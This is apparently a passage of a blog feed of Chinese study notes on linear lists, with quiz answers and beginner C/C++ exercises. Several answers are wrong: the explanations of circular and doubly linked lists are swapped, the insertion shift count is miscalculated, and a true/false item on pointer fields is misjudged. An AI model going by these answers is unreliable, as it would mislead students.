-C. 0(1)
-D. O(n)</p><p>答案:D</p><p>解释:假设在4个节点的顺序表上进行插入或者删除。插入1个元素就需要移动3个元素。即n-1个元素。删除也想通。</p><h2 id="在一个长度为n的顺序表中若要在第i1≤i≤n个元素前插入一个元素时则需向后移动个元素。">在一个长度为n的顺序表中,若要在第i(1≤i≤n)个元素前插入一个元素时,则需向后移动()个元素。</h2>
-<p>A. i
-B. n-1+1
-C. n-i-1
-D. n-i</p><p>答案:D</p><p>解释:假设长度为4，若要在第2个元素前插入一个元素k(k表示整数)时。</p><p>1 2 3 4 -&gt; 1 k 2 3 4。 这里移动了3个元素。k之前的元素不需要移动。扩大范围之后就是n-i</p><p>在这种情况下，答案中并没有包含插入位置本身，所以不是n-i-1而是n-1个元素。因此对于在位置i前插入一个元素的情况，所需要移动的元素个数是n-i个。</p><p>出现n-i-1的情况是题目中需要出现移动插入元素本身。</p><p>出现n-i+1的情况是在位置i及其之后的元素都需要后移。这种情况一般都是包含了插入点位置上的元素。</p><h2 id="以下链表结构中从当前结点出发能够访问到任意结点的是。">以下链表结构中,从当前结点出发能够访问到任意结点的是()。</h2>
-<p>A. 循环链表和单向链表
-B. 单向链表和双向链表
-C. 单向链表、双向链表和循环链表
-D. 循环链表和双向链表</p><p>答案:D</p><p>解释:只有循环链表和双向链表可以访问任意节点。</p><p>循环链表包含了pre指针和next指针。他可以向前或者向后移动。</p><p>双向链表的特点是尾结点指向头结点，形成一个环状结构。这样，无论从哪个节点出发，都能遍历整个链表。</p><p>单链表因为只有一个next指针,无法保证在一个方向上访问到链表中的所有结点。</p><h2 id="等概率情况下在有n个结点的顺序表上做插入结点运算需平均移动结点的数目为。">等概率情况下,在有n个结点的顺序表上做插入结点运算,需平均移动结点的数目为()。</h2>
-<p>A. n/2
-B. (n-1)/2
-C. (n+1)/2
-D. n</p><p>答案:A</p><p>解释:</p><h3 id="a的情况">A的情况</h3>
-<p>1.若要在头部插入一个元素(i=1),则需要移动n个节点。</p><p>2.若要在尾部插入一个元素(i=n+1),则需要移动0个节点。</p><p>3.若要在中间插入一个元素(i=n/2),需要移动n/2个节点。</p><p>假设所有的位置概率相同=n,1+2+3+…+n=&gt;(n+1)*n/2</p><p>![Image description](f<figure class="post__image"><img loading="lazy" src="https://sharenjun.github.io/media/posts/13/image-20241012002039010-2.png" alt="Image description" width="1774" height="1045"  sizes="100vw" srcset="https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-2-xs.png 300w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-2-sm.png 480w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-2-md.png 768w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-2-lg.png 1024w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-2-xl.png 1360w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-2-2xl.png 1600w"></figure>ile:///<a href="https://sharenjun.github.io/media/posts/13/image-20241011234944425.png">https://sharenjun.github.io/media/posts/13/image-20241011234944425.png</a> =1875x316)</p><h3 id="b的情况">B的情况</h3>
-<p>去掉头部或尾部的插入/删除次数。假设n=4,则算出来平均次数为1.5次。</p><h3 id="c的情况">C的情况</h3>
-<p>所有结点移动的次数再加上x部分。假设n=4,则算出来的平均次数为2.5次。超出需要移动的次数了。这一部分理解的并不深刻。不知道这样的解释正确不正确。</p><h2 id="在的运算中使用顺序表比链表好">在()的运算中,使用顺序表比链表好</h2>
-<p>A. 根据序号查找
-B. 根据元素查找
-C. 删除
-D. 插入</p><p>答案:A</p><p>解释:顺序表按照序号查找最快。</p><h2 id="在一个长度为n的顺序表中若要删除第i1≤i≤n个元素则需向前移动个元素。">在一个长度为n的顺序表中,若要删除第i(1≤i≤n)个元素,则需向前移动()个元素。</h2>
-<p>A. i
-B. n-i-1
-C. n-i
-D. n-i+1</p><p>答案:C</p><p>解释:与插入类似。</p><h2 id="下而关于线性表的叙述中错误的是。">下而关于线性表的叙述中,错误的是()。</h2>
-<p>A. 线性表采用链接存储,便于插入和删除操作。
-B. 线性表采用顺序存储,必须占用一片连续的存储单元。
-C. 线性表采用链接存储,不必占用一片连续的存储单元。
-D. 线性表采用顺序存储,便于进行插入和删除操作。</p><p>答案:D</p><p>解释:</p><p><strong>A. 线性表采用链接存储，便于插入和删除操作。</strong></p><p>正确。链式存储（如单链表、双链表）允许在任意位置方便地插入或删除元素，只需调整指针而无需大规模的数据移动。</p><p><strong>B. 线性表采用顺序存储，必须占用一片连续的存储单元。</strong></p><p>正确。顺序存储（如数组）需要在内存中分配一片连续的存储空间，以存放所有元素。</p><p><strong>C. 线性表采用链接存储，不必占用一片连续的存储单元。</strong></p><p>正确。链式存储中各结点通过指针连接，因此不需要连续的存储单元，各结点可以分布在内存的不同位置。</p><p><strong>D. 线性表采用顺序存储，便于进行插入和删除操作。</strong></p><p>错误。顺序存储在插入和删除操作时，需要移动大量元素，尤其在表头或表中间位置操作时会显著增加操作时间，因此不方便。</p><h1 id="填空题">填空题</h1>
-<h2 id="1">1</h2>
-<p>若对一个线性表经常进行查找操作，而很少进行插入和删除操作时，则采用____存储结构为宜，相反，若经常进行的是插入和删除操作时，则采用____存储结构为宜。
-我的答案：
-(1) 顺序
-(2) 链式</p><h2 id="2">2</h2>
-<p>线性表L=(a1,a2,…，an)采用顺序存储，假定删除表中任意元素的概率相同，则删除一个元素平均需要移动元素的个数是</p><p>(1) (n-1)/2</p><p>假设n=4. L=(a1,a2,a3,a4);</p><p>删除 a1，需要移动3个元素(a2,a3,a4)。 n-1</p><p>删除 a2，需要移动2个元素(a3,a4)。 n-2</p><p>删除 a3，需要移动1个元素(a4)。 n-3</p><p>删除 a4，需要移动0个元素。</p><p>(3+2+1+0)/n=1.5</p><p>(n-1)+(n-2)+(n-3)+…+0=<code>n(n-1)/2</code> 再利用(n(n-1)/2)/n得到(n-1)/2</p><h2 id="3">3</h2>
-<p>在长度为n的顺序表中，如果要在第n个元素前插入一个元素，要后移____个元素。</p><p>(1) 1</p><p>长度为n，在n前插入一个元素。只要移动1个即可。就是n本身。</p><h2 id="4">4</h2>
-<p>链表相对于顺序表的优点是插入、删除方便;缺点是存储密度__小__。</p><p>解释:这是因为链表中的每个节点不仅需要存储数据本身，还需要存储指向下一个节点的指针（在双向链表中还需存储指向前一个节点的指针），这会额外占用存储空间。因此，链表的存储密度（即数据元素所占用的总存储空间与链表的实际存储空间之比）低于顺序表。</p><h2 id="5">5</h2>
-<p>顺序表相对于链表的优点是：____和随机存取;链表相对于顺序表的优点是：____方便。</p><p>(1) 节省存储
-(2) 插入删除</p><h2 id="6">6</h2>
-<p>链式存储的特点是利用____来表示数据元素之间的逻辑关系。</p><p>(1) 指针</p><h2 id="7">7</h2>
-<p>在单链表中要在已知结点<em>p之前插入一个新结点，需找到</em>p的直接前趋结点的地址，其查找的时间复杂度为____。</p><p>(1) O(n)</p><h2 id="8">8</h2>
-<p>在双向链表中，每个结点有两个指针域，一个指向其____结点，另一个指向其____结点。</p><p>(1) 前驱
-(2) 后继</p><h2 id="9">9</h2>
-<p>在一个双链表中，设指针p是指向该表中待删除的结点，则需要执行的操作为：____。</p><p>(1):</p><p>p-&gt;pre-&gt;next=p-&gt;next;//p的前驱节点的next指针,指向p-&gt;next个元素。</p><p>p-&gt;next-&gt;pre=p-&gt;pre;//p的后继节点的pre指针,指向p-&gt;pre个元素</p><p>//以上实现断链的效果。</p><p>free(p);</p><figure class="post__image"><img loading="lazy" src="https://sharenjun.github.io/media/posts/13/image-20241012002039010-3.png" alt="Image description" width="1774" height="1045"  sizes="100vw" srcset="https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-3-xs.png 300w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-3-sm.png 480w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-3-md.png 768w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-3-lg.png 1024w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-3-xl.png 1360w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241012002039010-3-2xl.png 1600w"></figure><h1 id="判断题">判断题</h1>
-<h2 id="1-1">1</h2>
-<p>线性表的链式存储结构优于顺序存储结构。 x</p><h2 id="2-1">2</h2>
-<p>顺序表结构适宜于进行顺序存取，而链表适宜于进行随机存取。 x</p><p>解释:</p><p><strong>顺序表</strong>（例如数组）适合 <strong>随机存取</strong>，因为每个元素的地址是连续的，访问第i个元素的时间复杂度是O(1)即可以通过直接计算内存地址快速访问。</p><p><strong>链表</strong> 适合 <strong>顺序存取</strong>，因为链表的节点在内存中不是连续的，访问某个特定位置的元素需要从头开始逐个遍历，时间复杂度为O(n)</p><h2 id="3-1">3</h2>
-<p>在线性表的链式存储结构中，逻辑上相邻的两个元素在物理位置上并不一定紧邻。√</p><h2 id="4-1">4</h2>
-<p>顺序表的每个结点只能是一个简单类型，而链表的每个结点可以是一个复杂类型。x</p><h2 id="5-1">5</h2>
-<p>线性链表的删除算法简单，因为当删除链中某个结点后，计算机会自动地将后续的各个单元向前移动。 x</p><h2 id="6-1">6</h2>
-<p>插入和删除操作是数据结构中最基本的两种操作，所以这两种操作在数组中也经常使用。 x</p><p>解释:数组适合随机存取。并不适合插入、删除。</p><h2 id="7-1">7</h2>
-<p>线性表采用顺序存储，必须占用一片连续的存储单元。√</p><h2 id="8-1">8</h2>
-<p>线性表链式存储的特点是可以用一组任意的存储单元存储表中的数据元素。√</p><h2 id="9-1">9</h2>
-<p>顺序存储方式的优点是存储密度大，插入、删除效率高。 x</p><h2 id="10">10</h2>
-<p>链表的每个结点都恰好包含一个指针域。√</p>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>数据结构题练习</title>
-        <author>
-            <name>d1omg</name>
-        </author>
-        <link href="https://sharenjun.github.io/shu-ju-jie-gou-ti-lian-xi.html"/>
-        <id>https://sharenjun.github.io/shu-ju-jie-gou-ti-lian-xi.html</id>
-
-        <updated>2024-10-02T21:14:46+08:00</updated>
-            <summary></summary>
-        <content type="html">
-            <![CDATA[
-                <h1 id="已知线性表（a1-a2-a3-an）按顺序存于内存，每个元素都是非零整数，试设计用最少时间把所有值为负数的元素移到全部正数值元素前边的算法：例：（x-x-xxx-x-x）变为（-x-x-xxxx）">已知线性表（a1 a2 a3 …an）按顺序存于内存，每个元素都是非零整数，试设计用最少时间把所有值为负数的元素移到全部正数值元素前边的算法：例：（x,-x,-x,x,x,-x …x）变为（-x,-x,-x…x,x,x）</h1>
-<pre><code class="language-c++">#include &lt;iostream&gt;
-
-void swap(int *a, int *b) {
-    int temp = *a;
-    *a = *b;
-    *b = temp;
-}
-void ReRange(int arr[],int n)
-{
-    int k=0;//标志小于0的数
-    for(int i = 0;i&lt;n;i++)
-    {//循环开始，循环一整个数组的.
-        //调试
-        // printf(&quot;%d &quot;,arr[i]);
-        if(arr[i]&lt;0)
-        {
-            //i和k不能相等
-            if(i!=k)
-            {
-                //交换
-                swap(&amp;arr[i],&amp;arr[k]);
-            }
-            k++;
-        }
-    }
-}
-void PrintArr(int arr[],int n)
-{
-    for(int i =0;i&lt;n;i++)
-    {
-        printf(&quot;%d &quot;,arr[i]);
-    }
-    printf(&quot;\n&quot;);
-}
-
-int main()
-{
-    int arr[] = {4, -3, 2, -7, 1, -9, 8, -6, 5};
-    int n=sizeof(arr)/sizeof(arr[0]);
-    ReRange(arr,n);
-    PrintArr(arr,n);
-    return 0;
-}
-</code></pre>
-<h1 id="试编写在带头结点的单链表l中删除（一个）最小值结点的（高效）算法。">试编写在带头结点的单链表L中删除（一个）最小值结点的（高效）算法。</h1>
-<pre><code class="language-c++">#include &quot;main2.h&quot;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-typedef  int E;
-typedef struct Lnode
-{
-    E data;//Lnode结构体的数据域
-    struct Lnode *next;//Lnode结构体的next指针
-}Lnode,*p_Lnode;
-
-void Init_Lnode(p_Lnode &amp;L)
-{
-    L=(p_Lnode)malloc(sizeof(Lnode));
-    L-&gt;next=NULL;
-}
-
-void Insert_tail(p_Lnode &amp;L,E element)
-{
-    p_Lnode s,r=L;
-    while (r-&gt;next)
-    {
-        r=r-&gt;next;
-    }
-    s=(p_Lnode)malloc(sizeof(Lnode));
-    s-&gt;data=element;
-    s-&gt;next=NULL;//尾插法就是需要把数据域的最后一个置为空;
-    r-&gt;next=s;
-}
-void PrintChain(p_Lnode L)
-{
-    L=L-&gt;next;//跳过头节点
-    int i =0;
-    while (L!=NULL)
-    {
-        printf(&quot;%d &quot;,L-&gt;data);
-        L=L-&gt;next;
-        i++;
-    }
-}
-void DeleteChainElement(p_Lnode &amp;L)
-{
-    if(L==NULL||L-&gt;next==NULL) return;
-
-    p_Lnode pre=L;//设置第一个数字的指针,指向头节点
-    p_Lnode p=pre-&gt;next;//设置p指针，指向第一个数据节点
-    p_Lnode minpre=pre;//保留最小值节点的前驱节点
-    p_Lnode min=p;//保留最小数值的节点
-
-    while (p!=NULL)//这里应该时p!=NULL.因为p=pre-&gt;next一直在变
-    {
-        if(p-&gt;data &lt; min-&gt;data)
-        {
-            min=p;//更新最小值节点
-            minpre=pre;//更新最小值节点的前驱节点
-        }
-        pre=p;
-        p=p-&gt;next;
-    }
-    minpre-&gt;next=min-&gt;next;//因为要释放掉节点了。所以改变了节点指向的位置
-    free(min);
-}
-int main()
-{
-    p_Lnode L;
-    Init_Lnode(L);
-    Insert_tail(L,9);
-    Insert_tail(L,2);
-    Insert_tail(L,3);
-    Insert_tail(L,4);
-    Insert_tail(L,6);
-    PrintChain(L);
-
-    printf(&quot;after delete element&quot;);
-    DeleteChainElement(L);
-    PrintChain(L);
-}
-</code></pre>
-<h1 id="对线性表l（a1an）">对线性表L=（a1…an）</h1>
-<p>(1)如L为顺序表，请设计算法将L就地逆置。</p><p>(2)若L为带头结点的单链表，设计算法将L就地逆置。</p><p>知识点</p><p>将顺序表 逆置。</p><p>将带头结点的单链表逆置。</p><p>逆置考点在考研中也有涉及。</p>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>数据结构实验教程</title>
-        <author>
-            <name>d1omg</name>
-        </author>
-        <link href="https://sharenjun.github.io/shu-ju-jie-gou-shi-yan-jiao-cheng.html"/>
-        <id>https://sharenjun.github.io/shu-ju-jie-gou-shi-yan-jiao-cheng.html</id>
-
-        <updated>2024-09-15T22:18:28+08:00</updated>
-            <summary></summary>
-        <content type="html">
-            <![CDATA[
-                <p>/<em>标准C++17</em>/</p><h1 id="预备知识">预备知识</h1>
-<h2 id="指针的简单应用">指针的简单应用</h2>
-<pre><code class="language-c++17">#include &lt;iostream&gt;
-#include &lt;stdio.h&gt;
-#include &lt;malloc.h&gt;
-
-int main()
-{
-    int x;
-    int *q,*p;
-    //p default set scanf x value;
-    //q is default set for malloc;
-    x=10;
-    p=&amp;x;
-    q=(int *)malloc(100);
-    *q=100;
-    printf(&quot;*p=%d,*q=%d\n&quot;,*p,*q);
-    free(q);
-    return 0;
-}
-</code></pre>
-<h2 id="销售排行榜">销售排行榜</h2>
-<pre><code class="language-c++17">dingyi.h
-#ifndef DINGYI_H
-#define DINGYI_H
-#define N 8
-#endif //DINGYI_H
-</code></pre>
-<pre><code class="language-c++17">#include &lt;stdio.h&gt;
-#include &quot;dingyi.h&quot;
-
-void printXing(int n)
-{
-    for(int i=0;i&lt;N;i++)
-    {
-        printf(&quot;*****&quot;);
-    }
-    printf(&quot;\n&quot;);
-}
-void input(int a[],int n)
-{
-    printXing(10);
-    printf(&quot;请输入%d个人的销售量\n&quot;,n);
-    for(int i=0;i&lt;n;i++)
-    {
-        scanf(&quot;%d&quot;,&amp;a[i]);
-    }
-    printXing(10);
-}
-void print(int a[],int n)
-{
-    // printXing(10);
-    printf(&quot;%d个人的销售量排行榜如下:\n&quot;,n);
-    for(int i=0;i&lt;n;i++)
-    {
-        printf(&quot;%3d &quot;,a[i]);
-        // printf(&quot;\n&quot;);
-        // printXing(10);
-    }
-};
-
-void swap(int *x, int *y)
-{
-    int t;
-    t = *x;
-    *x = *y;
-    *y = t;
-}
-//sort的作用就是一个一个比较. 8 和 7. 8和6这样一个一个比.
-void sort(int a[],int n)
-{
-    for(int i=0;i&lt;N;i++)
-    {
-        for(int j=0;j&lt;N-1;j++)
-        {
-            if(a[j]&lt;a[j+1]){swap(&amp;a[j],&amp;a[j+1]);}
-        }
-    }
-}
-
-
-int main()
-{
-    int a[N];
-    input(a,N);
-    sort(a,N);
-    print(a,N);
-}
-</code></pre>
-<h2 id="选十佳">选十佳</h2>
-<pre><code class="language-c++17">#include &lt;stdio.h&gt;
-#include &lt;conio.h&gt;
-#define N 6 //选手编号
-#define M 3 //N项成绩
-
-//定义的结构体,结构体里面的变量
-typedef struct student
-{
-    int number;//学号之类的
-    char name[12];//姓名
-    float score[3];//3项成绩
-    float ave;// 平均值
-
-}Student;
-
-void average(Student s[],int i,int m)
-{
-    //s[]存储一整个数组数据.i对应结构体中的number.m对应结构体中的???
-    int j;//对应for循环中的j.
-    s[i].ave=0;
-    for(j=0;j&lt;m;j++)
-    {
-        //计算平均成绩
-        //s[i].c[j]对应输入的三项成绩
-        scanf(&quot;%f&quot;,&amp;s[i].score[j]);
-        s[i].ave=s[i].ave+s[i].score[j];
-        //要计算平均值应该是
-        // s[i].ave=s[i].ave/m;
-
-    }
-}
-
-void input(Student s[],int i,int m)
-{
-   int n;
-    for(n=0;n&lt;i;n++)
-    {
-        //首先调用scanf用来输入学号和姓名.
-        scanf(&quot;%d%s&quot;,&amp;s[n].number,&amp;s[n].name);
-        //后面再调用average函数来进行平均数的计算.在计算之前还会有scanf函数是用来
-        average(s,n,m);
-    };
-};
-
-void print(Student s[],int i)
-{
-    int n;
-    for(n=0;n&lt;i;n++)
-    {
-        //输出
-        printf(&quot;%-4d%20s%8.1f%8.1f%8.1f%6.1f\n&quot;, s[n].number, s[n].name, s[n].score[0], s[n].score[1], s[n].score[2], s[n].ave);
-        //%-4d的意思是左对齐并保留至少 4 个字符宽度。如果输出的数字不足 4 位，会在右侧补空格；如果超过 4 位，则不截断。
-        //%20s的意思是右对齐并保留至少 20 个字符宽度。如果字符串不足 20 个字符，会在左侧补空格；如果超过 20 个字符，则不会截断。
-        //%8.1f表示保留总宽度为 8 个字符，其中小数点后保留 1 位小数。右对齐，左侧补空格。
-        //%6.1f表示保留总宽度为 6 个字符，其中小数点后保留 1 位小鼠。右对齐，左侧补空格。
-    }
-};
-
-void sort(Student s[],int i)
-{
-    int n,m;
-    Student t;//构造这一个t结构体是因为要交换一整个的数据.
-    for(n=0;n&lt;i;n++)//第一层循环控制 前面一个数据
-    {
-        for(m=0;m&lt;i-n-1;m++)//第二层循环控制 后面一个数据.为什么要-1是因为是从0开始
-        {
-            if(s[m].ave&lt;s[m+1].ave){t=s[m];s[m]=s[m+1];s[m+1]=t;}//判断前面是否小于后面.条件满足则交换.
-        }
-    }
-};
-
-int main()
-{
-
-    Student s[N];
-
-    printf(&quot;请输入%d个选手的编号、姓名和%d项成绩:\n&quot;,N,M);
-    input(s,N,M);
-
-    printf(&quot;排序前的结果:\n&quot;);
-    print(s,N);
-    sort(s,N);
-
-    printf(&quot;排序后的结果:\n&quot;);
-    print(s,N);
-    printf(&quot;前三名结果:\n&quot;);
-    print(s,3);
-    getch();//调用&lt;conio.h&gt;文件头.作用是从stdio流中读字符，即从控制台读取一个字符，但不显示在屏幕上
-    return 1;
-}
-/*测试数据
-1 ln 98 97 98
-2 ym 95 97 98
-3 gjj 98 99 97
-4 zyn 95 97 93
-5 lx 94 95 96
-6 ld 92 93 95
-*/
-</code></pre>
-<h1 id="顺序表">顺序表</h1>
-<h2 id="我的顺序表">我的顺序表</h2>
-<h2 id="我的电话本-顺序表的应用">我的电话本-顺序表的应用</h2>
-<h2 id="顺序表的应用-合并线性表">顺序表的应用-合并线性表</h2>
 
             ]]>
         </content>
